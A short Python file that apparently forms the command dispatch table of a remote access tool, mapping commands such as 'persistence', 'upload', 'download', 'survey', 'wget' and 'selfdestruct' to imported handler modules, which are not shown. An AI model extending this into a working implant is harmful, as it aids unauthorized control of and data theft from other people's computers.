#!/usr/bin/env python
# coding: utf-8

# my files
from extras import scan
from extras import survey
from extras import toolkit
from extras import common
from extras import persistence
from extras import transfer

#################################
##           Commands          ##
#################################

# commands that (may) return a result
active = {
    'download': transfer.download,
    'upload': transfer.upload,
    'persistence': persistence.run,
    'scan': scan.scan,
    'survey': survey.run,
    'migrate': common.nothing,
    'netapi': common.nothing,
    'python': common.python,
    'wget': toolkit.wget,
    'selfdestruct': toolkit.selfdestruct,
    'unzip': toolkit.unzip
}
